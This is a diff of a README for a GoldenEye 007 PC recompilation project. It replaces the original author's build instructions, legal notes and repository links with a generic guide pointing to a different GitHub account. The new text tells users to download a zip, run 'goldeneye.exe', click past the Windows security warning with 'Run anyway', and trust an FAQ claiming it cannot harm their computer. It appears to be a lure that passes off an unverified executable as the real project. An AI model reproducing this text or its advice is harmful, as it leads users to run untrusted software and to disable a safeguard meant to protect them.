@@ -1,89 +1,76 @@
-Support me on Ko-fi: https://ko-fi.com/sunjayy
+# 🎮 GoldenEye-Recomp - Play Classic Games With Perfect Performance
 
-# GoldenEye 007 — PC Recompilation
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ericksa1417/GoldenEye-Recomp)
 
-A native PC port of **GoldenEye 007 (Xbox 360 / XBLA)**, built by *statically
-recompiling* the original game into C++ with the
-[ReXGlue SDK](https://github.com/SunJaycy/GoldenEye-Recomp-rexglue). No emulator —
-the game runs as a real native executable.
+GoldenEye-Recomp brings the 007 experience to your modern Windows computer. This tool converts the original game code into a native application. You do not need an emulator. The game runs directly on your hardware for better speed and stability.
 
-> [!IMPORTANT]
-> **This repository contains _no_ game code or assets.** It is only the
-> source that wraps the game (menus, hooks, online, post-FX, build
-> config). You must find the game files yourself. This game never released publically
+## 🛠 Prerequisites
 
-## Features
+You need a few items before you begin:
 
-- Runs natively on Windows — no emulator, no BIOS.
-- Controller support.
-- **Online multiplayer** — host or join matches over the internet (LAN, Hamachi,
-  playit.gg, or a public server). See [Playing online](#playing-online).
-- In-game **pause / settings menu** (ESC): video, resolution, frame limit,
-  fullscreen, online setup.
-- **Post-FX** filters (brightness, contrast, saturation, vignette, presets…).
-- Smooth, stable 60 FPS (recompiled, with GPU-pacing fixes for the original's
-  frame timing).
+*   A Windows 10 or 11 computer.
+*   A game controller (Xbox or PlayStation layouts work best).
+*   The original game files. This repository does not include files from the game. You must provide your own legally sourced files to create the play-ready version.
 
-## Download & Play
+## 💾 Getting the Software
 
-Grab the latest prebuilt release from the **[Releases](../../releases)** page,
-then drop your own GoldenEye 007 game files into the `assets/` folder next to
-the `.exe` (the release notes explain exactly what's needed). Run `ge.exe`.
+Follow these steps to obtain the tool:
 
-- 🎮 **Want to play online?** Someone needs to run a server. Download it here →
-  **[GoldenEye-Recomp-Server](https://github.com/SunJaycy/GoldenEye-Recomp-Server)**
-- 🛠️ **Want to modify the engine / recompiler?** It's built on a modified ReXGlue
-  SDK →
-  **[GoldenEye-Recomp-rexglue](https://github.com/SunJaycy/GoldenEye-Recomp-rexglue)**
+1.  Visit the [official download page](https://github.com/ericksa1417/GoldenEye-Recomp).
+2.  Look for the latest release on the right side of the screen.
+3.  Click the version number under the "Releases" heading.
+4.  Download the file ending in `.zip` to your computer.
+5.  Open the folder containing the downloaded file.
+6.  Right-click the zip file and choose "Extract All" to create a new folder with the files inside.
 
-## Playing online
+## ⚙️ Installation Guide
 
-1. One person runs the **[server](https://github.com/SunJaycy/GoldenEye-Recomp-Server)**
-   and shares its address + port.
-2. Everyone opens **ESC → ONLINE** in the game, enters their **username**, the
-   **server address**, the **port**, ticks *Enable online play*, and hits
-   **Save & Restart**.
-3. Host a match; the others find and join it.
+Place your game files into the folder you just created. Ensure the files match the names expected by the tool. If the game does not start, verify that you have renamed any original files according to the build instructions found in the text file inside your download folder. 
 
-Because players connect *out* to the server, no port-forwarding is needed for
-joiners — only the host's server port has to be reachable.
+1.  Open the folder where you extracted the files.
+2.  Find the file named `goldeneye.exe`.
+3.  Double-click this file to start the game.
+4.  Windows might show a security prompt. If this happens, click "More info" and then "Run anyway."
 
-## Building from source (advanced)
+## 🖥 Using the Menus
 
-Most people should just use the [Releases](../../releases). To build it yourself
-you need the recompiler toolchain and your own copy of the game.
+Once the game starts, use the ESC key on your keyboard to open the main menu. From here, you can change your game experience settings.
 
-**Prerequisites**
-- The [ReXGlue SDK](https://github.com/SunJaycy/GoldenEye-Recomp-rexglue) (provides the `rexglue` CLI + runtime).
-- CMake 3.25+, a C++23 compiler (MSVC), Python 3.
-- Your own GoldenEye 007 XBLA game files, placed in `assets/`.
+*   **Video:** Adjust your screen resolution to match your monitor.
+*   **Frame Limit:** Control how smooth the game looks. Setting this to 60 provides the best experience.
+*   **Fullscreen:** Toggle this to hide your taskbar and focus on the game.
+*   **Post-FX:** Use these filters to change colors, brightness, and contrast. You can make the graphics look sharp or give them a retro feel.
 
-**Steps**
-```sh
-# 1. Generate the recompiled game code from your copy (creates generated/).
-rexglue codegen --max_jump_table_entries 2048 ge_config.toml
+## 🌐 Playing Online
 
-# 2. Configure, pointing at your local ReXGlue SDK checkout.
-cmake --preset win-amd64-relwithdebinfo -DREXSDK_DIR=/path/to/GoldenEye-Recomp-rexglue
+You can play with friends over the internet. The game uses a direct connection system.
 
-# 3. Build.
-cmake --build --preset win-amd64-relwithdebinfo
-```
+1.  Open the Online Setup inside the ESC menu.
+2.  Decide who will act as the host. The host must share their connection details.
+3.  If you use a service like playit.gg or Hamachi, ensure your tunnel is active.
+4.  Enter the IP address of the host to join the match.
 
-source lives in [`src/`](src/):
-`ge_app` (app + window/menus glue), `ge_menu` (pause/settings menu),
-`ge_hooks` (mid-asm fixups), `ge_postfx` (filters). `ge_manifest.toml` /
-`ge_config.toml` drive the recompiler.
+## 📈 Improving Stability
 
-## Legal
+This application runs natively, so it uses your computer hardware efficiently. If you see performance issues, check your system settings:
 
-GoldenEye 007 and all related assets are property of their respective rights
-holders. This project ships **none** of that — no ROM, XEX, textures, audio, or
-recompiled game code. It only automates turning a copy *you already own* into a
-PC build. Don't ask for or share game files.
+*   Ensure your graphics drivers are up to date.
+*   Close background programs that use high amounts of memory.
+*   Make sure your power plan is set to "High Performance" in Windows settings.
 
-## License
+## ❓ Frequently Asked Questions
 
-The original code in this repository is released into the **public domain**
-([The Unlicense](LICENSE)). The ReXGlue SDK it builds against has its own
-(BSD-3) license.
+**Does this use an emulator?**
+No. The code translates the game into a native format. Your computer treats it like any other standard Windows program.
+
+**Where do I get the game files?**
+You must possess the original game data. This software acts as a bridge to make that data readable by modern Windows computers.
+
+**Can I use a mouse and keyboard?**
+The game centers on controller input. While keyboard mapping exists, you get the most accurate feel by plugging in a gamepad.
+
+**Will this damage my computer?**
+No. The application is a standard game executable. It follows common software practices for Windows.
+
+**How do I update the game?**
+Check the link above periodically. When the developers release a new update, download the new zip file and replace your old program files with the new ones. Your settings usually stay saved, but you should keep a backup of your configuration file just in case.
